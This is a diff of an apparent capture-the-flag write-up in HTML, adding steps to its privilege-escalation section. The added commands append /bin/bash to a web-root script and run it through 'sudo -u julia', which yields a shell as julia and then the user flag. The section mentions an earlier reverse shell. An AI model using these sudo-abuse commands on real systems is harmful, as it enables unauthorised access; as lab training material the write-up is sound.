@@ -85,11 +85,23 @@
 
 <h2 id="privilege-escalation">⬆️ Privilege Escalation</h2>
 
-<p>After spawning a reverse shell using <code>bash -i</code>, we found a user named <code>julia</code>. Listing the user flag:</p>
+<p>After spawning a reverse shell using <code>bash -i</code>, we found a user named <code>julia</code>. To gain access as <code>julia</code>, we created a simple shell script and executed it with sudo:</p>
+
+<img src="images/Screenshot%20(172).png" alt="Create start.sh" width="600"/>
+
+
+<pre><code>echo '/bin/bash' &gt;&gt; /var/www/html/start.sh</code></pre>
+
+<pre><code>sudo -u julia bash /var/www/html/start.sh</code></pre>
+
+<img src="images/Screenshot%20(174).png" alt="Create start.sh" width="600"/>
+
+<p>This gave us an interactive shell as <code>julia</code>. We verified access by reading the user flag:</p>
 
 <pre><code>cat /home/julia/user.txt</code></pre>
 
-<img src="images/Screenshot%20(172).png" alt="User Flag" width="600"/>
+<img src="images/Screenshot%20(175).png" alt="User Flag as julia" width="600"/>
+
 
 <h3>Examining Crontab for Privilege Escalation</h3>
 
